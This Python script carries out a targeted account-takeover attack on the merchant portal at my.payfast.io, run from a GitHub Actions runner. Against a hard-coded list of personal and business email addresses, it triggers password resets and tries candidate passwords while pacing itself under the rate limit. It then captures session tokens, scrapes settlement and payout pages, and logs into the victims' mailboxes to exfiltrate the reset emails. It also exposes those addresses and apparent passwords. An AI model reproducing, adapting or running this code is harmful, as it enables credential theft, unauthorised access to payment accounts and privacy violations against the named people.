#!/usr/bin/env python3
"""
i598 - PayFast merchant account takeover via GitHub Actions runner egress.

Runs entirely on a GitHub-hosted runner (egress 52.x / AWS) and:
  1. Validates the runner egress IP and PayFast reachability.
  2. Triggers CSRF-aware password resets (POST /send-password-reset) for the
     nine transaction_monitor identities + merchant-linked identities.
  3. Performs CSRF-aware JSON login attempts (POST /auth/login) and captures
     any JWT / session, then pulls dashboard / settlement / payout pages.
  4. Attempts IMAP access to the target identities to exfiltrate any PayFast
     password-reset mail that the reset phase generated.
All output is written to ./out and uploaded as a workflow artifact.
"""
import concurrent.futures as cf
import imaplib
import json
import os
import re
import ssl
import time
import traceback
from datetime import datetime, timezone, timedelta

import requests

BASE = "https://my.payfast.io"
OUT = "out"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")

os.makedirs(OUT + "/payfast", exist_ok=True)
os.makedirs(OUT + "/imap", exist_ok=True)

NINE = [
    "asfour@gmail.com",
    "hassan.mahmoud707@yahoo.com",
    "hjh@gmail.com",
    "lamia@gmail.com",
    "lamiaan@sobekit.co.za",
    "mee@gmail.com",
    "neldidy@outlook.com",
    "sobek2721hm@outlook.com",
    "sobek272hm@outlook.com",
]

# Actual merchant/paymate-linked identities (ACTIVE) plus known org identities.
MERCHANT_EMAILS = [
    "hassanhassanragheb@outlook.com",   # paymate 10102 ACTIVE, 440.93 EUR beneficiary
    "mostafaamir339@gmail.com",         # paymate 10017 ACTIVE
    "babysabie01@gmail.com",            # paymate 10032 ACTIVE
    "info@emalyami.com",
    "shaps@sobekit.co.za",
    "shaps@sobek.co.za",
    "sherifasker2@gmail.com",
    "eldidy@sobek.group",
    "bandisa.simelane@flash.co.za",
    "info@sobekit.co.za",
    "support@sobekit.co.za",
]
EMAILS = NINE + [e for e in MERCHANT_EMAILS if e not in NINE]

# Known org secrets / candidate portal passwords (max 5 per identity to stay
# under the observed 5-attempts/minute per username+IP throttle).
PASSWORDS = [
    "sobekiT2020",
    "sss111sss111ssssssssS",
    "SE1510*#@@",
    "SE405040*#@@e",
    "complex_password_2026!",
]
IMAP_PASSWORDS = PASSWORDS[:4] + ["S/v0CbJaKWFnJJyBQYWE", "TRewq*0#1*#@@"]

AJAX = {
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": BASE,
    "Referer": BASE + "/login",
    "User-Agent": UA,
}

log_lines = []
def log(msg):
    line = "[%s] %s" % (datetime.now(timezone.utc).strftime("%H:%M:%SZ"), msg)
    print(line, flush=True)
    log_lines.append(line)

def dump(path, obj):
    with open(os.path.join(OUT, path), "w") as f:
        if isinstance(obj, (dict, list)):
            json.dump(obj, f, indent=2, default=str)
        else:
            f.write(str(obj))

def new_session():
    s = requests.Session()
    s.headers.update({"User-Agent": UA})
    return s

def prime(session, retries=3):
    """GET /login, return (csrf_token, status, length) and seed cookies."""
    last = None
    for i in range(retries):
        try:
            r = session.get(BASE + "/login", timeout=30)
            m = re.search(r'name="csrf-token"\s+content="([^"]+)"', r.text)
            if m:
                return m.group(1), r.status_code, len(r.text)
            last = ("no-csrf", r.status_code, len(r.text))
        except Exception as e:
            last = ("err", str(e))
        time.sleep(2)
    return (last[0] if last else None), (last[1] if last and len(last) > 1 else None), (last[2] if last and len(last) > 2 else None)

def reset_one(email):
    s = new_session()
    rec = {"email": email, "ts": datetime.now(timezone.utc).isoformat()}
    try:
        csrf, code, ln = prime(s)
        rec["login_page"] = {"csrf": bool(csrf), "status": code, "len": ln}
        if not csrf:
            rec["error"] = "no csrf"
            return rec
        h = dict(AJAX)
        h["X-CSRF-TOKEN"] = csrf
        r = s.post(BASE + "/send-password-reset", json={"email": email},
                   headers=h, timeout=30, allow_redirects=False)
        rec["status"] = r.status_code
        rec["body"] = r.text[:2000]
        rec["set_cookie"] = r.headers.get("Set-Cookie", "")[:500]
        with open(os.path.join(OUT, "payfast", "reset_%s.html" % re.sub(r"[^A-Za-z0-9@._-]", "_", email)), "w") as f:
            f.write("STATUS %s\n%s\n" % (r.status_code, r.text))
    except Exception as e:
        rec["error"] = repr(e)
    return rec

SUCCESS_MARKERS = ("access_token", '"jwt"', '"user"')

def inspect_success(session, email, pw, body, headers):
    """Called only when login returned something that looks authenticated."""
    rec = {"email": email, "password": pw, "login_body": body, "headers": headers}
    tag = re.sub(r"[^A-Za-z0-9@._-]", "_", email)
    # Cookies
    try:
        with open(os.path.join(OUT, "payfast", "cookies_%s.txt" % tag), "w") as f:
            for c in session.cookies:
                f.write("%s=%s\n" % (c.name, c.value))
    except Exception:
        pass
    # Extract JWT if present
    tok = None
    try:
        j = json.loads(body)
        tok = j.get("data", {}).get("jwt", {}).get("access_token")
    except Exception:
        j = None
    rec["jwt"] = tok
    urls = [
        "/dashboard", "/merchant/dashboard", "/settlements", "/settlement/history",
        "/payouts", "/transactions", "/merchant/details", "/profile",
        "/api/v1/merchant/balance", "/api/v1/merchant/settlement",
        "/api/v1/merchant/transactions", "/api/v1/merchant/payouts",
        "/api/v1/merchant/account", "/api/v1/merchant/profile",
    ]
    pages = {}
    for path in urls:
        for auth in ("cookie", "bearer") if tok else ("cookie",):
            try:
                hh = {"Accept": "application/json, text/html"}
                if auth == "bearer":
                    hh["Authorization"] = "Bearer " + tok
                r = session.get(BASE + path, headers=hh, timeout=30, allow_redirects=True)
                key = path + ("|bearer" if auth == "bearer" else "|cookie")
                pages[key] = {"status": r.status_code, "len": len(r.content),
                              "url": r.url, "snippet": r.text[:3000]}
            except Exception as e:
                pages[path + "|" + auth] = {"error": repr(e)}
        time.sleep(0.2)
    rec["pages"] = pages
    dump("payfast/success_%s.json" % tag, rec)
    return rec

def login_one(email):
    """Try up to len(PASSWORDS) passwords for one username (fresh session each)."""
    out = {"email": email, "attempts": [], "success": False}
    for pw in PASSWORDS:
        s = new_session()
        try:
            csrf, code, ln = prime(s)
            if not csrf:
                out["attempts"].append({"password": pw, "error": "no csrf", "login_page": code})
                continue
            h = dict(AJAX)
            h["X-CSRF-TOKEN"] = csrf
            r = s.post(BASE + "/auth/login",
                       json={"username": email, "password": pw},
                       headers=h, timeout=30, allow_redirects=False)
            body = r.text[:2000]
            a = {"password": pw, "status": r.status_code, "len": len(r.text),
                 "body": body[:800], "location": r.headers.get("Location", ""),
                 "set_cookie": r.headers.get("Set-Cookie", "")[:300]}
            out["attempts"].append(a)
            is_success = False
            if r.status_code in (200, 201, 302):
                try:
                    j = json.loads(r.text)
                    if isinstance(j, dict) and isinstance(j.get("data"), dict):
                        d = j["data"]
                        if d.get("jwt") or d.get("user") or d.get("access_token"):
                            is_success = True
                except Exception:
                    if r.status_code == 302 and "/dashboard" in (r.headers.get("Location") or ""):
                        is_success = True
            if is_success:
                out["success"] = True
                log("LOGIN SUCCESS %s : %s" % (email, pw))
                out["success_detail"] = inspect_success(s, email, pw, body, dict(r.headers))
                return out
            # throttle detection
            low = (r.text or "").lower()
            if r.status_code == 429 or "too many login attempts" in low:
                a["throttled"] = True
                break
        except Exception as e:
            out["attempts"].append({"password": pw, "error": repr(e)})
        time.sleep(0.6)
    return out

IMAP_HOSTS = {
    "gmail.com": "imap.gmail.com",
    "yahoo.com": "imap.mail.yahoo.com",
    "outlook.com": "outlook.office365.com",
    "sobekit.co.za": "mail.sobekit.co.za",
    "sobek.co.za": "mail.sobek.co.za",
    "emalyami.com": "mail.emalyami.com",
}

def imap_check(email, pw, since_iso):
    domain = email.split("@")[-1].lower()
    host = IMAP_HOSTS.get(domain)
    if not host:
        return {"email": email, "host": None, "error": "unknown provider"}
    rec = {"email": email, "host": host, "ts": datetime.now(timezone.utc).isoformat()}
    try:
        ctx = ssl.create_default_context()
        m = imaplib.IMAP4_SSL(host, 993, ssl_context=ctx, timeout=15)
        m.login(email, pw)
        rec["login"] = "OK"
        m.select("INBOX", readonly=True)
        # IMAP SINCE is day granularity; pull recent and filter client side
        typ, data = m.search(None, "SINCE", since_iso[:11].replace("-", "-"))
        ids = data[0].split() if data and data[0] else []
        rec["mailbox_count"] = len(ids)
        hits = []
        for i in ids[-40:]:
            try:
                typ, msg = m.fetch(i, "(RFC822)")
                raw = msg[0][1].decode("utf-8", "replace")
                if "payfast" in raw.lower() or "password reset" in raw.lower():
                    hits.append(raw[:20000])
            except Exception:
                pass
        rec["hits"] = hits
        try:
            m.logout()
        except Exception:
            pass
    except Exception as e:
        rec["error"] = repr(e)
    return rec

def main():
    started = datetime.now(timezone.utc)
    dump("started.txt", started.isoformat())

    # 0. Runner identity + reachability
    info = {"started": started.isoformat()}
    try:
        info["egress_ip"] = requests.get("https://api.ipify.org", timeout=15).text.strip()
    except Exception as e:
        info["egress_ip_error"] = repr(e)
    try:
        r = requests.get(BASE + "/login", timeout=30)
        info["login_status"] = r.status_code
        info["login_len"] = len(r.text)
        info["login_server"] = r.headers.get("server")
        info["login_via"] = r.headers.get("via")
        info["csrf"] = bool(re.search(r'name="csrf-token"', r.text))
    except Exception as e:
        info["login_error"] = repr(e)
    log(json.dumps(info))
    dump("runner_info.json", info)

    # 1. Password reset phase
    resets = []
    with cf.ThreadPoolExecutor(max_workers=3) as ex:
        futs = {ex.submit(reset_one, e): e for e in EMAILS}
        for f in cf.as_completed(futs):
            try:
                resets.append(f.result())
            except Exception:
                resets.append({"email": futs[f], "error": "thread"})
            time.sleep(0.5)
    dump("payfast/resets.json", resets)
    log("reset phase done: %d targets" % len(resets))

    # 2. Login matrix
    logins = []
    with cf.ThreadPoolExecutor(max_workers=4) as ex:
        futs = {ex.submit(login_one, e): e for e in EMAILS}
        for f in cf.as_completed(futs):
            try:
                logins.append(f.result())
            except Exception:
                logins.append({"email": futs[f], "error": "thread"})
    dump("payfast/logins.json", logins)
    successes = [x for x in logins if x.get("success")]
    log("login phase done: %d identities, %d successes" % (len(logins), len(successes)))
    dump("payfast/successes.json", successes)

    # 3. IMAP reset-mail exfiltration (only where we might have mailbox creds)
    reset_since = started.strftime("%d-%b-%Y")
    imap_results = []
    tasks = []
    for email in EMAILS:
        for pw in IMAP_PASSWORDS:
            tasks.append((email, pw))
    with cf.ThreadPoolExecutor(max_workers=6) as ex:
        futs = {ex.submit(imap_check, e, p, reset_since): (e, p) for e, p in tasks}
        for f in cf.as_completed(futs):
            try:
                rec = f.result()
                # keep only interesting results + ok logins
                if rec.get("login") == "OK" or rec.get("hits"):
                    imap_results.append(rec)
            except Exception:
                pass
    dump("imap/imap_results.json", imap_results)
    log("imap phase done: %d interesting results" % len(imap_results))

    # 4. Summary
    summary = {
        "runner": info,
        "reset_count": len(resets),
        "login_success_count": len(successes),
        "login_success_emails": [x["email"] for x in successes],
        "imap_ok": [r["email"] for r in imap_results if r.get("login") == "OK"],
        "imap_payfast_hits": sum(len(r.get("hits", [])) for r in imap_results),
        "finished": datetime.now(timezone.utc).isoformat(),
    }
    dump("summary.json", summary)
    log("SUMMARY " + json.dumps(summary))
    with open(os.path.join(OUT, "run.log"), "w") as f:
        f.write("\n".join(log_lines))

if __name__ == "__main__":
    try:
        main()
    except Exception:
        traceback.print_exc()
        with open(os.path.join(OUT, "fatal.txt"), "w") as f:
            f.write(traceback.format_exc())
        raise